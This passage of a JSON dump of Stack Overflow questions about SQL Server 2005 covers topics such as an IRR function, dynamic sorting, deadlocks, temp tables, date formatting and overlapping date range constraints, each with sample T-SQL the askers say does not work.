1\n        SET @strIDs = RIGHT(@strIDs, DATALENGTH(@strIDs) - @sepPos)\n        SET @sepPos = CHARINDEX(',', @strIDs)\n      END\n\n    SET @guess = CASE WHEN ISNULL(@guess, 0) &lt;= 0 THEN 0.00001 ELSE @guess END\n\n    SELECT @NPV = SUM(value / POWER(1 + @guess, id)) FROM @t_IDs\n    WHILE @NPV &gt; 0 \n      BEGIN\n        SET @guess = @guess + 0.00001\n        SELECT @NPV = SUM(value / POWER(1 + @guess, id)) FROM @t_IDs\n      END\n    RETURN @guess\n  END\n</code></pre>\n\n<p>Sample usage looks like this:</p>\n\n<pre><code>SELECT  dbo.ufn_IRR('-4000,1200,1410,1875,1050',0.00001)\n</code></pre>\n\n<p>But in my case I would like to avoid creating string from my columns, as this:</p>\n\n<pre><code> SELECT  dbo.ufn_IRR(\n    cast(round(sum([M0]), 2) AS NVARCHAR)+','\n   +cast(round(sum([M1]), 2) AS NVARCHAR)+','\n   +cast(round(sum([M2]), 2) AS NVARCHAR)+','\n   +cast(round(sum([M3]), 2) AS NVARCHAR)+','\n   +cast(round(sum([M4]), 2) AS NVARCHAR)+','\n   +...+','\n   +cast(round(sum([M20]), 2) AS NVARCHAR)\n ,0.00001)\n</code></pre>\n\n<p>I think it is pointless to first create a string and then inside function cut it into table.<br />\nI would like to modify IRR function so than I can pass my columns, but I don't have Idea how I should do that :/</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":12079137,"title":"Displaying multiple strings of data in the same cell (OnSameLine)","body":"<p>I have a data type called vectors. During the process I created the user has check boxes to select 1 or more vectors (up to 4). After selecting these I want the table to display those potential multiple values on the same line under vectors (i.e. 1,3,4). Here is my following code:</p>\n\n<pre><code>SELECT DISTINCT Requirement.RequirementId, CapabilityAreaName, RequirementNumber, RequestorOrg, RequestDate, RequestorSID, RequestorPhone, RequestorName, RequestEmail, RequestDescription, dbo.requirementVectorsOnSameLine(Requirement.RequirementId) as Vectors, title FROM Requirement\nINNER JOIN CapabilityArea\nON Requirement.CapabilityAreaId = CapabilityArea.CapabilityAreaId\nINNER JOIN dbo.RequirementVectors\nON Requirement.RequirementId = RequirementVectors.RequirementId\nWHERE Requirement.CapabilityAreaId = '57' AND WaitingFlag = '1'\n</code></pre>\n\n<p>The only thing I receive with this code is the column names of my tables. When I delete <code>INNER JOIN dbo.RequirementVectors</code> and <code>dbo.requirementVectorsOnSameLine(Requirement.RequirementId) as Vectors</code> I am lost on how I can get this to work. </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":117,"score":2,"question_id":12077538,"title":"How to Sort datetime in ROW_NUMBER() OVER ( ORDER BY clause","body":"<p>Hi the below query is a prototype of a bigger complex query\nThe problem is that i should be able sort any column in any order (i.e. ASC and DESC) based on user input.</p>\n\n<pre><code>CREATE table #Table1(\nName varchar(10) PRIMARY key,\nDOB DateTime,\nRate numeric(10,2)  \n)\n\nINSERT INTO #Table1 (Name,DOB,Rate) values ('Name1','2/2/2012',10.23)\nINSERT INTO #Table1 (Name,DOB,Rate) values ('Name2','3/2/2012',120.23)\nINSERT INTO #Table1 (Name,DOB,Rate) values ('Name3','4/2/2012',110.23)\nINSERT INTO #Table1 (Name,DOB,Rate) values ('Name4','5/2/2012',140.23)\nINSERT INTO #Table1 (Name,DOB,Rate) values ('Name15','6/2/2012',130.23)\nINSERT INTO #Table1 (Name,DOB,Rate) values ('Name6','2/21/2012',1120.23)\n\nDeclare @SortColumn varchar(10)\nDECLARE @SortExpression varchar (10)\n\nSET @SortColumn = 'DOB'\nSET @SortExpression = 'DESC' -- Need to sort in both ASC and DESC\n\nSelect \n            Name,\n            DOB,\n            Rate,\n            ROW_NUMBER() OVER \n                (ORDER BY \n                    CASE WHEN @SortColumn = 'Name' then Name\n                         WHEN @SortColumn = 'DOB' THEN DOB\n                         WHEN @SortColumn = 'Rate' THEN Rate\n                    END  +  @SortExpression \n                ) AS RowNumber  \n                FROM \n                #Table1\n</code></pre>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":1618,"score":0,"question_id":9014531,"title":"Read SQL Server transaction log","body":"<p>How we can read SQL Server transaction logs, I know using <code>dbcc</code> command but row data is in hex format how we can read it in text format or convert the hex data to text.i want to make a tool that can read logs.third party tools are available but they are paid tools.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":119,"score":2,"question_id":11995777,"title":"%% Vs CONTAINSTABLE","body":"<p>This is in continuation to my <strong><a href=\"http://stackoverflow.com/questions/11994281/near-matches-not-found-in-containstable\">Previous Query</a></strong></p>\n\n<h2>DDL</h2>\n\n<pre><code>CREATE TABLE [dbo].[t](\n    [words] [varchar](1000) NULL,\n    [id] [int] IDENTITY(1,1) NOT NULL\n) ON [PRIMARY]\n</code></pre>\n\n<h2>DML</h2>\n\n<pre><code>insert into t(words)values('this is my laptop')\ninsert into t(words)values('this does not contains heqadphone')\n</code></pre>\n\n<p>These two inserts are iterated 250 times...</p>\n\n<h2>SQL Queries - 1</h2>\n\n<pre><code>SELECT * FROM \nt as t\nJOIN CONTAINSTABLE(t, words,'\"*heqadphone\"') fulltextSearch\nON\nt.[Id] = fulltextSearch.[KEY]\n</code></pre>\n\n<h2>SQL Query - 2</h2>\n\n<pre><code>Select * from t where words like '%heqadphone%'\n</code></pre>\n\n<h2>Confusions</h2>\n\n<p>Normally we are advised to not use double %% as stated in my later query. But After checking the SQL Profiler Reads and Duration</p>\n\n<h2>Query 1 shows more reads/duration . Click the below link to see details</h2>\n\n<p><strong><a href=\"http://i.stack.imgur.com/kRVhe.jpg\" rel=\"nofollow\">SQL Profiler Reads and Duration for Query - 1</a></strong></p>\n\n<h2>Query 2 shows less reads/duration . Click the below link to see details</h2>\n\n<p><strong><a href=\"http://i.stack.imgur.com/72fNC.jpg\" rel=\"nofollow\">SQL Profiler Reads and Duration for Query - 2</a></strong></p>\n\n<p>Can you confirm, Ideally which query can be good to use?</p>\n"},{"tags":["sql-server-2005","hibernate","c3p0"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":928,"score":0,"question_id":1700008,"title":"SQL Server 2005 - Cannot rollback nested transaction","body":"<p>Sometimes I get the following from SQL Server 2005 when executing a stored procedure:</p>\n\n<pre>\nCaused by: com.microsoft.sqlserver.jdbc.SQLServerException: Cannot roll back T1. No transaction or savepoint of that name was found.\n    at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerStatement.getNextResult(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.doExecutePreparedStatement(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement$PrepStmtExecCmd.doExecute(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.TDSCommand.execute(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerStatement.executeCommand(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerStatement.executeStatement(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.executeUpdate(Unknown Source)\n    at com.mchange.v2.c3p0.impl.NewProxyCallableStatement.executeUpdate(NewProxyCallableStatement.java:2160)\n    at com.sm.persistence.dao.TransactionRejectDAO.callSpMoveTransaction(TransactionRejectDAO.java:631)\n    ... 6 more\n</pre>\n\n<p>Any ideas?</p>\n\n<p>When the connection pooling mechanism attempts to close the prepared statement:</p>\n\n<pre>\nNov 9, 2009 9:32:55 AM com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement close\nWARNING: SQLServerPreparedStatementID:201 ( ConnectionID:139 TransactionID:0x1A00000039000000): Error (ignored) closing PreparedHandle:0\ncom.microsoft.sqlserver.jdbc.SQLServerException: The server failed to resume the transaction. Desc:390000001a.\n    at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDatabaseError(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.TDSTokenHandler.onEOF(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.TDSParser.parse(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.TDSParser.parse(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement$1PreparedHandleClose.doExecute(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.TDSCommand.execute(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerConnection.executeCommand(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerStatement.executeCommand(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.closePreparedHandle(Unknown Source)\n    at com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement.close(Unknown Source)\n    at com.mchange.v1.db.sql.StatementUtils.attemptClose(StatementUtils.java:41)\n    at com.mchange.v2.c3p0.stmt.GooGooStatementCache.synchronousDestroyStatement(GooGooStatementCache.java:413)\n    at com.mchange.v2.c3p0.stmt.GooGooStatementCache.closeAll(GooGooStatementCache.java:351)\n    at com.mchange.v2.c3p0.impl.NewPooledConnection.closeAllCachedStatements(NewPooledConnection.java:673)\n    at com.mchange.v2.c3p0.impl.NewPooledConnection.close(NewPooledConnection.java:543)\n    at com.mchange.v2.c3p0.impl.NewPooledConnection.close(NewPooledConnection.java:234)\n    at com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool$1PooledConnectionResourcePoolManager.destroyResource(C3P0PooledConnectionPool.java:470)\n    at com.mchange.v2.resourcepool.BasicResourcePool$1DestroyResourceTask.run(BasicResourcePool.java:964)\n    at com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread.run(ThreadPoolAsynchronousRunner.java:547)\nNov 9, 2009 9:32:55 AM com.microsoft.sqlserver.jdbc.SQLServerPreparedStatement close\nWARNING: SQLServerPreparedStatementID:186 ( ConnectionID:139 TransactionID:0x1A00000039000000): Error (ignored) closing PreparedHandle:0\n</pre>\n\n<p>The stored procedure contains a nested transaction T1 which I believe is unnecessary. Could that be the problem?</p>\n\n<p>Thanks</p>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":77,"score":1,"question_id":11912740,"title":"Group columns into multiple rows and Group_concate like MySQL in SQL Server","body":"<p>Ive been looking for a way to show one column in multiple rows, one cell. The content of it separated by commas.</p>\n\n<p>For example, in stead of:</p>\n\n<pre>\nProjectID  Name                 count\n-------------------------------------\n   2       Technical Services    31\n   1       Security Services     32\n   7       Technical Services    32\n</pre>\n\n<p>I would like the result of my query to look like this:</p>\n\n<pre>\nName                 Label\n---------------------------\nTechnical Services   31,2\nTechnical Services   32,7\nSecurity Services    32,1 \n</pre>\n\n<p>I also want the result of my query to look like this: (like <code>Group_Concate</code> in MySQL)</p>\n\n<pre>\nName                 Label\n-------------------------------\nSecurity Services    32,1 \nTechnical Services   31,2: 32,7\n</pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":45,"score":4,"question_id":12051111,"title":"Select 2 columns from 3 tables","body":"<p>I have 3 tables:</p>\n\n<pre><code>Table t1:     Table t2:     Table t3:     \n+----+----+   +----+----+   +----+----+   \n| i1 | i2 |   | i2 | c2 |   | i1 | c1 |   \n+----+----+   +----+----+   +----+----+   \n|  1 | 22 |   |  11| cc |   |  1 | e  |   \n|  2 | 33 |   |  22| bb |   |  2 | f  |   \n|  3 | 11 |   |  33| aa |   |  3 | g  |   \n+----+----+   +----+----+   +----+----+   \n</code></pre>\n\n<p>and I want to select the colum c2 from t2 and c1 from t3 using the table t1 with the columns i1 and i2 and the result would be thins:</p>\n\n<pre><code>requested Tabel:     \n+----+----+   \n| c1 | c2 |   \n+----+----+   \n|  e | bb |   \n|  f | aa |   \n|  g | cc |   \n+----+----+   \n</code></pre>\n\n<p>I did a select with a union like this:</p>\n\n<pre><code>select pve.c1\nfrom dbo.t3 as pve\njoin dbo.t1 as v\non pve.i1 = v.i1\nunion\nselect vse.c2\nfrom dbo.t2 as vse\njoin dbo.t1 as e\non vse.i2 = e.i2\n</code></pre>\n\n<p>and the result is this:</p>\n\n<pre><code>resulted Tabel:     \n+----+\n| i1 |\n+----+\n|  e |\n|  f |\n|  g |\n|  bb|\n|  aa|\n|  cc|\n+----+\n</code></pre>\n\n<p>Thanks!</p>\n"},{"tags":["sql-server-2005","jdbc","spring-jdbc","database-deadlocks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":11990797,"title":"Best way to tackle deadlocks","body":"<p>Its simple question , but I wasted few days with having any clear solution over it.</p>\n\n<p>I am using spring jdbc templates as my DAO layer mssql sever 2005 as my database and we have a order entry system. Now we are getting so many dead lock scenarios when we have more than 5 people on the system. it seems lock happens when people try to create new order while others updating existing orders. It seems a conflict between insert and update statement for same table.</p>\n\n<p>I did few thing to fix this and didn't work any of them. So now I am thinking to introduce java.util.semaphore or a Lock and control the concurrent access of threads, or just I can go for Synchronized methods or blocks. </p>\n\n<p>What do you guys think about this? Is there any better way of handling this on data base server?</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server-2005","entity-framework","sql-server-2008","datetime","datetime2"],"answer_count":6,"favorite_count":19,"up_vote_count":75,"down_vote_count":0,"view_count":15585,"score":75,"question_id":316422,"title":"Using SQL Server 2008 and SQL Server 2005 and date time","body":"<p>I've built a entity framework model against a 2008 database.  All works ok against the 2008 database.  When I try to update the entity on a 2005 database I get this error.  </p>\n\n<pre>The version of SQL Server in use does not support datatype 'datetime2</pre>\n\n<p>I specifically did not use any 2008 features when I built the database.  I can't find any reference to datetime2 in the code.  And, yes the column is defined as \"datetime\" in the database.  </p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":78,"score":-1,"question_id":12056716,"title":"How to insert multiple rows with one statement","body":"<pre><code>CREATE DATABASE Exercise\n\nUSE Exercise;\nGo\n\nCREATE TABLE Employees\n(\nEmployeeNumber nchar(10),\nEmployeeName nvarchar(50),\nDateHired datetime,\nHourlySalary money\n);\nGO\n\n\nINSERT INTO Employees\nVALUES(N'593705', N'Frank Somah', N'20061004', 26.15),\n(N'720947', N'Paul Handsome', N'20000802', 36.05);\nGO\n\nINSERT INTO Employees(EmployeeName, EmployeeNumber, DateHired)\nVALUES(N'Clarice Simms', N'971403', N'20011112');\nGO\n</code></pre>\n\n<p>The insert statement is not working.\nIncorrect syntax near ','.</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":61,"score":-4,"question_id":12057406,"title":"sql transaction not working","body":"<p>SQL transaction not working:</p>\n\n<pre><code>BEGIN TRANSACTION AddEmployees\n   INSERT INTO Employees\n      VALUES(N'595002', N'John Meah', N'20000212', 32.25),\n      (N'928375', N'Chuck Stansil', N'20080628'),\n      (N'792764', N'Orlando Perez', N'20000616', 12.95);\n   COMMIT TRANSACTION AddEmployees;\nGO\n</code></pre>\n"},{"tags":["sql-server","delphi","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":154,"score":0,"question_id":12055641,"title":"retrieve image into DBImage in delphi?","body":"<p>I have a field in a database defined as varbinary that contains images. \nI can't retrieve these images. I use delphi <code>DBImage</code> and I get this error:</p>\n\n<blockquote>\n  <p>'bitmap not valid' </p>\n</blockquote>\n\n<p>when I connect to the photo field.\nMy Database is sql server 2005.</p>\n\n<p>pls help me>>> </p>\n"},{"tags":["sql-server-2005","crystal-reports-xi"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":165,"score":0,"question_id":10020309,"title":"Crystal Reports Record Select with SQL Text Type","body":"<p>I'm trying to improve an existing datamining report by forcing Crystal Reports v11 to evaluate a SQL like on a text column when it retrieves the dataset rather having it evaluate after drawing back all the results. I've already traced this within SQL and it will save an enormous amount of reads but once I remove the existing string parsing formulas within CR and try to add the text field to the record select formula, crystal seems to disregard the fact that I have added it (within the SQL statement generated).</p>\n\n<p>I haven't found any documentation about CR with SQL datatypes specifically. Does Crystal not allow evaluation of text types on select or should something be added to the parameter for it to work properly (IE ToText, etc)?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["asp.net","sql-server-2005","reporting-services","ssas","olap"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":613,"score":5,"question_id":10513342,"title":"Display an OLAP SQL Server in a web page?","body":"<p>I have this scenario:</p>\n\n<p>WServer 2008, SQL Server 2005, MS Analysis services (SSAS), ISS7 and a OLAP CUBE.</p>\n\n<p>I need to <strong>embed the OLAP result</strong> in a webpage in an existing site.</p>\n\n<p><strong>I don't need any</strong> selection of dimension, no any drill down, no any 3 dimension, just a passive result of a preset MDX query.</p>\n\n<p>Below here an example of MDX query used: <strong>(Sell statistic for an agent in a period)</strong></p>\n\n<pre><code>SELECT NON EMPTY { [Measures].[Valore] } ON COLUMNS,\n    NON EMPTY { ([Prodotti].[Top Marca].[Top Marca].ALLMEMBERS * [Calendario].[Anno -  Mese].[Mese].ALLMEMBERS * [Agenti].[Cod Agente].[Cod Agente].ALLMEMBERS ) }\n    DIMENSION PROPERTIES MEMBER_CAPTION, MEMBER_UNIQUE_NAME ON ROWS FROM ( SELECT ( { [Calendario].[Anno].&amp;[2012] } ) ON COLUMNS \n    FROM ( SELECT ( { [Agenti].[Vw Agenti].&amp;[005] } ) ON COLUMNS FROM [Vendite])) \n    CELL PROPERTIES VALUE, BACK_COLOR, FORE_COLOR, FORMATTED_VALUE, FORMAT_STRING, FONT_NAME, FONT_SIZE, FONT_FLAGS\n</code></pre>\n\n<p>Below an easy result that i need to show in the website:</p>\n\n<p><img src=\"http://i.stack.imgur.com/5f95X.jpg\" alt=\"olap result\"></p>\n\n<p>I tried to use Report Viewer but seem I can't due this error:</p>\n\n<blockquote>\n  <p>Remote report processing requires Microsoft SQL Server 2008 Reporting Services or later</p>\n</blockquote>\n\n<p>and I can't install SQL Server 2008 so I need an alternative solution.</p>\n\n<p>I tried some open source but they need install JAVA and more, most also not connect to SQL Server or required a different web server.</p>\n\n<p>I tried also use a TSQL query but it return only 1 column for the months when in real i need many columns as months calculated</p>\n\n<p><em>NOTE: the users are many with many different operating system and browser as iPad, Mac, Windows, Linux, ... so the result must be an HTML output</em></p>\n\n<p><strong>So my question is:</strong></p>\n\n<p>What is the best way to develop a simple webpage (asp or aspx) (server side or client side) to query the cube to get a simple result <strong>(must be HTML)</strong> as show above, without any selection by the user ?</p>\n\n<p>Or what didn't I understand at all with this scenario ?</p>\n\n<p>Thanks in advance for who can help me!</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12052494,"title":"Will performance improve when set filegroups on different disk?? ","body":"<p>I've created a partitioned table for a database and set primary file (<code>.mdf</code>) &amp; log file(<code>.ldf</code>) path in <code>C:</code> and set secondary file's (<code>.ndf</code>) path to <code>D:</code> on the same hard disk. </p>\n\n<p>Then did some queries performance. its well. </p>\n\n<p>Now, my question is: if I put the primary file onto one hard disk and secondary file onto another hard disk, is it perform well.??</p>\n\n<p>What is the performance difference between for both task???</p>\n\n<p>pls, anyone say.....</p>\n\n<p>advance thanks!!...</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":85,"score":0,"question_id":12044938,"title":"Update statement taking 10 minutes with large data set","body":"<p>I have a SQL stored procedure in which one statement is taking 95% of the total time (10 minutes) to complete. <code>#Records</code> has approximately 133,000 rows and <code>Records</code> has approximately 12,000 rows.  </p>\n\n<pre><code>  -- Check Category 1 first\n  UPDATE #Records\n    SET Id = (SELECT TOP 1 Id FROM Records WHERE Cat1=#Records.Cat1)\n    WHERE Cat1 IS NOT NULL\n</code></pre>\n\n<p>I have tried adding a index to <code>Cat1</code> in <code>#Records</code>, but the statement time did not improve.</p>\n\n<pre><code>CREATE CLUSTERED INDEX IDX_C_Records_Cat1 ON #Records(Cat1)\n</code></pre>\n\n<p>A similar statement that follows, takes only a fraction of the time</p>\n\n<pre><code>  -- Check Category 2\n  UPDATE #Records\n    SET Id = (SELECT TOP 1 Id FROM Records WHERE Cat2=#Records.Cat2)\n    WHERE ID IS NULL\n</code></pre>\n\n<p>Any ideas on why this is happening or what I can do to make this statement more time effective?</p>\n\n<p>Thanks in advance.</p>\n\n<p>I am running this on Microsoft SQL Server 2005.</p>\n"},{"tags":["c#","asp.net","sql","sql-server-2005"],"answer_count":4,"favorite_count":4,"up_vote_count":5,"down_vote_count":0,"view_count":274,"score":5,"question_id":2808624,"title":"Which is good Pratice storing a uploaded File in DB or storing it in Filesystem","body":"<p>hi \nI have a File Uploader in my ASP.NET application Using C#, we can upload any type like images, documents, pdf etc. </p>\n\n<p>I m storing it in the Filesystem and having only the Name of the File in DB. \nMy doubt is can we store the entire file, images in DB. State me Which is good practice and why we need to use it.</p>\n\n<p>Either file System Storage or SQL DB Storage.</p>\n"},{"tags":["sql-server-2005","temporary-tables"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":469,"score":0,"question_id":3348476,"title":"SQL Server Temporary Table from Complex Stored Procedure","body":"<p>I have to create a temp table (#temp) from a variable or stored procedure</p>\n\n<p>(i.e)</p>\n\n<p>My stored procedure contains </p>\n\n<p>......</p>\n\n<pre><code>set @sql='select ...'\nset @sql=@sql+'..join..'\nset @sql=@sql+'....join..'\n</code></pre>\n\n<p>when i execute it (i.e) <code>exec (@sql)</code> it  returns some rows,i want to store that rows\nin a temp table.How to acheieve it?</p>\n\n<p>i tried something like</p>\n\n<pre><code>select\n       id,name,ward_no into,........ \n#temp\n\nfrom\n   ( \n     exec (@sql)\n   )derived\n</code></pre>\n\n<h2>Update</h2>\n\n<p>I found the logic</p>\n\n<p>(i.e)</p>\n\n<pre><code>create table #temp(....)\n\ninsert #temp exec(@sql) \n\nselect * from #temp\n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":601,"score":0,"question_id":3627282,"title":"converting date field format","body":"<p>I have a field with birthday as either '7/08/1986' or '07/08/1986'.</p>\n\n<p>I want to convert the value to like this '1986/08/07'. Simply converting from <strong>DD/MM/YYYY</strong> to <strong>YYYY/MM/DD</strong>. Kindly note down this is all in SQL Server 2005.</p>\n\n<p>Additionally, if the date is in single digit means still the output shd be shown in double digit like '07' not '7'.</p>\n\n<p>How do I do this conversion?</p>\n\n<p>Your kind replies will help me out. My thanks in advance.</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":100,"score":4,"question_id":11976883,"title":"Table containing TEXT column growing continuously","body":"<p>We've got a table in a production system which (for legacy reasons) is running SQL 2005 (9.0.5266) and contains a TEXT column (along with a few other columns of various datatypes).</p>\n\n<p>All of a sudden (since a week ago) we noticed the size of this one table increasing linearly by 10-15GB per day (whereas previously it has always remained at a constant size).  The table is a queue for a messaging system, and as such the data in it completely refreshes itself every few seconds.  At any one time there could be anywhere from 0 to around 1000 rows, but it fluctuates rapidly as messages are inserted, and sent (at which point they're deleted).</p>\n\n<p>We can't find anything that was changed on the day the growth started - so have no obvious potential cause identified at this stage.</p>\n\n<p>One \"obvious\" culprit is the TEXT column, and so we checked to see if any massive values were now being stored, but (using DATALENGTH) we found no single rows above around ~32k. We've run CHECKDB, updated space usage, rebuild all indexes, etc - nothing reduces the size (and CHECKDB showed no errors). </p>\n\n<p>We've queried sys.allocation_units and the size increase is definitely LOB_DATA (which show total_pages and used_pages increasing together at a constant rate).</p>\n\n<p>To reduce the database size last night we simple created a new table along-side the one in question (which is luckily referenced via a view by the application), dropped the old table, and renamed the new one.  We left last night, taking comfort in the fact that we'd alleviated the space issues, and that we had a backup of the dodgy table to investigate further today.\nHowever, this morning the table size is already up to 14GB (and growing), while there are only the usual ~500 rows in the table, and MAX(DATALENGTH(text_column)) is only showing around 35k.</p>\n\n<p>Any ideas as to what could be causing this \"runaway\" growth, or anything else that we could try or query to get more information about what exactly is using the space?</p>\n\n<p>Cheers, \nDave</p>\n"},{"tags":["sql","sql-server-2005","case-when"],"answer_count":4,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":1756,"score":4,"question_id":6042767,"title":"SQL Server CASE .. WHEN .. IN statement","body":"<p>On SQL server 2005 I am trying to query this select statement </p>\n\n<pre><code>SELECT\n    AlarmEventTransactionTableTable.TxnID,\n    CASE AlarmEventTransactions.DeviceID\n        WHEN DeviceID IN('7', '10', '62', '58', '60',\n                 '46', '48', '50', '137', '139',\n                 '142', '143', '164') THEN '01'\n        WHEN DeviceID IN('8', '9', '63', '59', '61',\n                 '47', '49', '51', '138', '140',\n                 '141', '144', '165') THEN '02'\n        ELSE 'NA' END AS clocking,\n\n    AlarmEventTransactionTable.DateTimeOfTxn\n FROM\n    multiMAXTxn.dbo.AlarmEventTransactionTable\n</code></pre>\n\n<p>It returns the error below </p>\n\n<pre><code> Msg 156, Level 15, State 1, Line 4 \n Incorrect syntax near the keyword 'IN'.\n</code></pre>\n\n<p>Please give me some advice on what could be wrong with my code.</p>\n"},{"tags":["sql","sql-server-2005","tsql","stored-procedures"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":5450,"score":2,"question_id":6388489,"title":"Insert Into temp table from a stored procedure that returns multiple result sets","body":"<p>Consider the following sql</p>\n\n<p>A stored proc called myProc which returns two result sets.  Result set 1 returns column1, column2.  Result set 2 returns column 3, column 4, column 5.</p>\n\n<p>The following sql will fail since the temp table only has defined 2 int columns.</p>\n\n<pre><code>Create Table #temp1(\nColumn1 int,\nColumn2 int)\n\ninsert into #temp1 exec myProc\n</code></pre>\n\n<p>My question is is it possible to just insert the first result set into #temp1?</p>\n"},{"tags":["sql-server","database","sql-server-2005","database-design","check-constraints"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":226,"score":1,"question_id":12035747,"title":"Date range overlapping check constraint","body":"<p>I've a simple table in sql server 2005 with 3 columns: DateStart, DateEnd and Value. I tried to set a \"table check constraint\" to avoid inserting overlapping records. For instance if in such table there is a record with DateStart = 2012-01-01 (first January) and DateEnd 2012-01-15 (15th January) than Check constraint must avoid inserting a record with DateStart=2012-01-10 (no care DateEnd), a record with DateEnd=2012-01-10 (no care DateStart) or a record with DateStart 2011-12-10 and DateEnd 2012-02-01.</p>\n\n<p>I defined a UDF in such way:</p>\n\n<pre><code>CREATE FUNCTION [dbo].[ufn_checkOverlappingDateRange]\n(\n    @DateStart AS DATETIME\n    ,@DateEnd AS DATETIME\n)\nRETURNS BIT \nAS\nBEGIN\n  DECLARE @retval BIT\n  /* date range at least one day */\n  IF (DATEDIFF(day,@DateStart,@DateEnd) &lt; 1)\n    BEGIN\n      SET @retval=0\n    END\n  ELSE\n    BEGIN\n      IF EXISTS\n        (\n          SELECT\n              *\n            FROM [dbo].[myTable]\n            WHERE\n            ((DateStart &lt;= @DateStart) AND (DateEnd &gt; @DateStart))\n            OR\n            ((@DateStart &lt;= DateStart) AND (@DateEnd &gt; DateStart))\n        )\n        BEGIN\n          SET @retval=0\n        END\n    ELSE\n      BEGIN\n            SET @retval=1\n          END\n        END\n  RETURN @retval\nEND\n</code></pre>\n\n<p>Then thought check could be this:</p>\n\n<pre><code>ALTER TABLE [dbo].[myTable]  WITH CHECK ADD  CONSTRAINT [CK_OverlappingDateRange] CHECK  ([dbo].[ufn_checkOverlappingDateRange]([DateStart],[DateEnd])&lt;&gt;(0))\n</code></pre>\n\n<p>But even with [myTable] empty EXISTS Operator returns true when i insert first record. Where i'm wrog ? Is it possible to set a constraint like this ?</p>\n\n<p>BTW I consider  DateStart includes in range and DateEnd excludes from range.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12042397,"title":"Dynamic Create Drop Stored Proc Script","body":"<p>I want to dynamically create a Drop/Create Script. For that I can calculate the <strong>Create</strong> part as below.</p>\n\n<pre><code>SELECT definition FROM sys.sql_modules\n</code></pre>\n\n<p><strong>My Query</strong> - can you suggest something for the <strong>Drop Stored Proc</strong> Part...</p>\n\n<p>I am trying a Create/Drop Script for <strong>Stored Proc</strong></p>\n"},{"tags":["sql","sql-server","sql-server-2005","stored-procedures"],"answer_count":9,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":4713,"score":4,"question_id":1043465,"title":"Creating Stored Procedure Syntax, relating to use of GO","body":"<p>Does anyone know why.</p>\n\n<pre><code>CREATE PROCEDURE My_Procedure\n    (@Company varchar(50))  \nAS  \n    SELECT PRD_DATE \n    FROM WM_PROPERTY_DATES \n    WITH (NOLOCK) \n    WHERE PRD_COMPANY = @Company \nGO\n</code></pre>\n\n<p>Gives me an error message in SQL management studio:</p>\n\n<blockquote>\n  <p><code>Msg 102, Level 15, State 1, Procedure My_Procedure, Line 1\n  Incorrect syntax near 'GO'.</code></p>\n</blockquote>\n\n<p>Now, this is the last statement of a batch, 